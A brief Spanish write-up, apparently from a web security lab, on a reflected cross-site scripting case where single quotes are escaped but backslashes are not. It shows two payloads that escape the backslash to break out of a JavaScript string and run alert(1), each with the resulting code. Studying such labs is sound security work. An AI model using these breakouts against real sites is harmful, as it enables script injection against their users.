Nos dicen que las single quotes están solo escapadas , si escapamos la barra invertida podemos inyectar la comilla simple
Interceptamos las request y enviamos esto : 

`\'-alert(1)//` 
```javascript
	var searchTerms = '\\'-alert(1)//';
```

o

`\'+%2b+alert(1)//` 
```javascript
	var searchTerms = '\\' + alert(1)//';
```
